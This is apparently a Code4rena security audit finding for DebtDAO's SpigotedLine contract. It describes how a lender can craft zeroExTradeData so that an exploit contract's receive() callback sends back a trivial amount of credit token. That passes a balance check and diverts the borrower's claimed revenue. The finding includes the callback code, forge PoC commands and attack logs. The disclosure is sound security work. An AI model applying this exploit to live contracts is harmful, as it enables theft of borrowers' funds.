## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- sponsor confirmed
- selected for report
- edited-by-warden
- M-04

# [Lender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData](https://github.com/code-423n4/2022-11-debtdao-findings/issues/110) 

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112
https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85


# Vulnerability details

## Impact

Lender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData.

In the design of the protocol, the lender can use the function claimAndRepay(), the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit. 

```
function claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external
        whileBorrowing
        nonReentrant
        returns (uint256) { 

...
// Line 106 - Line 112
uint256 newTokens = claimToken == credit.token ?
          spigot.claimEscrow(claimToken) :  // same asset. dont trade
          _claimAndTrade(                   // trade revenue token for debt obligation
              claimToken,
              credit.token,
              zeroExTradeData
          );
...
// Line 128 - Line 130 
 credits[id] = _repay(credit, id, repaid);

        emit RevenuePayment(claimToken, repaid);

...

}

```

```
function _claimAndTrade(
      address claimToken,
      address targetToken,
      bytes calldata zeroExTradeData
    )
        internal
        returns (uint256)
    {
        (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(
            claimToken,
            targetToken,
            swapTarget,
            address(spigot),
            unusedTokens[claimToken],
            zeroExTradeData
        );

        // we dont use revenue after this so can store now
        unusedTokens[claimToken] = totalUnused;
        return tokensBought;
    }
```
```
function claimAndTrade(
        address claimToken,
        address targetToken,
        address payable swapTarget,
        address spigot,
        uint256 unused,
        bytes calldata zeroExTradeData
    )
    external 
        returns(uint256, uint256)

{
...
 trade(
            claimed + unused,
            claimToken,
            swapTarget,
            zeroExTradeData
        );
        
        // underflow revert ensures we have more tokens than we started with
        uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;

        if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought
...


}

```

In the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert. 

The bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.

## Proof of Concept

The following code can manipulate and bypass the check to steal money of the borrower.
Step 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract. 
Step 2: In the exploit contract, have the receive() function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit. 

```
receive() external payable {
    console.log("Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance");
    uint256 amount = 100; 
    creditToken.transfer(address(line),amount);
    console.log("Receive the amount of ETH: %s", msg.value);
  }

```
In the receive() function, the exploit contract transfer some amount of creditToken to the SpigotedLine contract to bypass the check 
```
 if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought
```
Since this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken. 

This amount then will be used to repay the credit. 
So this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.

In the zip file in the Google_Drive link, there is the POC written for this bug. 
The test case is test_lender_can_claim_and_repay_3 in file SpigotedLine.t.modified.sol 
You can put this file to the tests folder
https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing

You can run the POC by calling: 
```
forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n
umber 15918000
```
Here I use the block-number to make the test log stable, but this does not impact the logic of POC. 

You can find the detailed log file: Line-of-Credit\test_claim_221107_2311.log
The full log file here: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing 
In this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 * ( 10 ** -18 ) BUSD for the borrower. 

Logs:
  Step 0: As a Borrower borrow some money 
  Step 1: Construct the tradeData to call claimAndRepay as the lender
  claimed: 1000000000000000000000
  unused: 0
  sellAmount: 1000000000000000000000
  Step 1: As the lender, call claimAndRepay with Malicious zeroExTradeData
  Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance
  Receive the amount of ETH: 632428006785336734
  emit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)
  emit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)
  RevenuePayment(token: DAI: [0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)

You can use the POC.patch here: https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing 
To use it use command 
```
git apply POC.patch

```

To run use command 
```
forge install
forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n
umber 15918000

```

The full code repository: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing 

## Tools Used
Foundry

## Recommended Mitigation Steps

This is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.